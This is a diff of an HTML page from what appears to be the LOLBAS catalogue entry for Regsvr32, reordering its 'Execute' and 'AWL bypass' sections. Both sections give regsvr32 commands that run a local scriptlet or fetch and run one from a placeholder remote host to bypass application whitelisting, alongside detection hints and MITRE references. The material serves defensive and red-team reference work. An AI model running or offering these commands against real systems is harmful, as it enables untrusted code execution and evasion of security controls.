@@ -28,18 +28,22 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Regsvr32/#execute">Execute</a></li>
-    
-    
-    <li><a href="/lolbas/Binaries/Regsvr32/#awl bypass">AWL bypass</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Regsvr32/#awl bypass">AWL bypass</a></li>
+	
+	
+	<li><a href="/lolbas/Binaries/Regsvr32/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>Used by Windows to register dlls</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -53,124 +57,108 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/</a></li>
+	<a href="https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/">https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/</a>
+	<br>
 	
-	<li><a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a></li>
+	<a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a>
+	<br>
 	
-	<li><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md</a></li>
+	<a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md">https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1117/T1117.md</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a </li>
+	Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>regsvr32.exe getting files from Internet</li>
+	regsvr32.exe getting files from Internet
+	<br>
 	
-	<li>regsvr32.exe executing scriptlet files</li>
+	regsvr32.exe executing scriptlet files
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Execute the specified remote .SCT script with scrobj.dll.</p>
-
+	
+<h2 id="awl bypass" class ="function-name">AWL bypass</h2>
+	
+		Execute the specified remote .SCT script with scrobj.dll.
+		<br>
+		<pre><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</code></pre>
 		Usecase:Execute code from remote scriptlet, bypass Application whitelisting
-        <pre><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Execute the specified local .SCT script with scrobj.dll.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Execute the specified local .SCT script with scrobj.dll.
+		<br>
+		<pre><code>regsvr32.exe /s /u /i:file.sct scrobj.dll</code></pre>
 		Usecase:Execute code from scriptlet, bypass Application whitelisting
-        <pre><code>regsvr32.exe /s /u /i:file.sct scrobj.dll</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a></li>
-	<br><br>	
-    
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
-</ul>
-<br><br>
-
-
-
-
-
-<h2 id="awl bypass" class="function-name">AWL bypass</h2>
-
-<p>The LOLBAS can bypass application whitelisting solutions.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Execute the specified remote .SCT script with scrobj.dll.</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Execute the specified remote .SCT script with scrobj.dll.
+		<br>
+		<pre><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</code></pre>
 		Usecase:Execute code from remote scriptlet, bypass Application whitelisting
-        <pre><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Execute the specified local .SCT script with scrobj.dll.</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Execute the specified local .SCT script with scrobj.dll.
+		<br>
+		<pre><code>regsvr32.exe /s /u /i:file.sct scrobj.dll</code></pre>
 		Usecase:Execute code from scriptlet, bypass Application whitelisting
-        <pre><code>regsvr32.exe /s /u /i:file.sct scrobj.dll</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1117">T1117</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
